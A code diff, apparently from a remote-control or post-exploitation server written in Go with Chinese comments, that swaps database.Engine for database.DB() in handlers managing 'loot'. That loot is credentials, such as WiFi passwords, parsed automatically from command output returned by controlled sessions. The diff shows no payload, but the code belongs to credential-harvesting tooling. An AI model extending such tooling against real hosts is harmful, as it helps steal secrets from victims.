@@ -38,7 +38,7 @@ func ListLoot(c *gin.Context) {
 		size = 200
 	}
 
-	session := database.Engine.Where("1=1")
+	session := database.DB().Where("1=1")
 	if uid != "" {
 		session = session.And("uid = ?", uid)
 	}
@@ -82,7 +82,7 @@ func AddLoot(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, gin.H{"error": "secret 与 note 至少填一项"})
 		return
 	}
-	if _, err := database.Engine.Insert(&body); err != nil {
+	if _, err := database.DB().Insert(&body); err != nil {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": "入库失败: " + err.Error()})
 		return
 	}
@@ -96,7 +96,7 @@ func DeleteLoot(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, gin.H{"error": "id 非法"})
 		return
 	}
-	if _, err := database.Engine.ID(id).Delete(&database.Loot{}); err != nil {
+	if _, err := database.DB().ID(id).Delete(&database.Loot{}); err != nil {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": "删除失败: " + err.Error()})
 		return
 	}
@@ -112,7 +112,7 @@ func AddLootIfNotEmpty(uid, lootType, user, realm, host, secret, note, source st
 		lootType = "note"
 	}
 	// 同一会话重复执行同一条提取命令（如 wifi 连跑两次）时避免重复入库
-	if has, _ := database.Engine.Where(
+	if has, _ := database.DB().Where(
 		"uid = ? AND type = ? AND host = ? AND secret = ? AND source = ?",
 		uid, lootType, host, secret, source,
 	).Get(&database.Loot{}); has {
@@ -123,7 +123,7 @@ func AddLootIfNotEmpty(uid, lootType, user, realm, host, secret, note, source st
 		Secret: secret, Note: note, Source: source,
 		CreatedAt: time.Now().Format("2006-01-02 15:04:05"),
 	}
-	if _, err := database.Engine.Insert(&item); err != nil {
+	if _, err := database.DB().Insert(&item); err != nil {
 		// 静默: 自动入库失败不阻断命令回包主链路
 		return
 	}
@@ -146,7 +146,7 @@ var (
 // IngestLootFromOutput 从一条命令回包中识别可入库的凭据，返回新入库条数。
 // 由 main 注入到 command.LootIngestFunc，在命令输出落到 shell 内容之后调用。
 func IngestLootFromOutput(uid, output string) int {
-	if database.Engine == nil || strings.TrimSpace(output) == "" {
+	if database.DB() == nil || strings.TrimSpace(output) == "" {
 		return 0
 	}
 	return ingestWindowsWifi(uid, output) + ingestLinuxWifi(uid, output)
